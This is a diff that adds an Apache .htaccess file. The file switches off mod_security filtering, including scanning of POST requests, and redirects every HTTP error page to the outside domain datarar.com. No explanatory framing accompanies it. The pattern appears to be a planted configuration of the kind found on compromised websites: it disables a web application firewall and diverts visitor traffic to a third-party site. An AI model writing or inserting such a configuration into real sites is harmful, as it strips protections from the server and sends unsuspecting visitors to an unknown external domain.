@@ -1,0 +1,29 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+
+RewriteEngine on
+
+# Error Pages
+ErrorDocument 400 http://datarar.com
+ErrorDocument 401 http://datarar.com
+ErrorDocument 402 http://datarar.Com
+ErrorDocument 403 http://datarar.Com
+ErrorDocument 404 http://datarar.Com
+ErrorDocument 405 http://datarar.Com
+ErrorDocument 406 http://datarar.Com
+ErrorDocument 407 http://datarar.Com
+ErrorDocument 408 http://datarar.Com
+ErrorDocument 409 http://datarar.Com
+ErrorDocument 410 http://datarar.Com
+ErrorDocument 411 http://datarar.Com
+ErrorDocument 412 http://datarar.Com
+ErrorDocument 413 http://datarar.Com
+ErrorDocument 414 http://datarar.Com
+ErrorDocument 500 http://datarar.Com
+ErrorDocument 501 http://datarar.Com
+ErrorDocument 502 http://datarar.Com
+ErrorDocument 503 http://datarar.Com
+ErrorDocument 504 http://datarar.Com
+ErrorDocument 505 http://datarar.Com
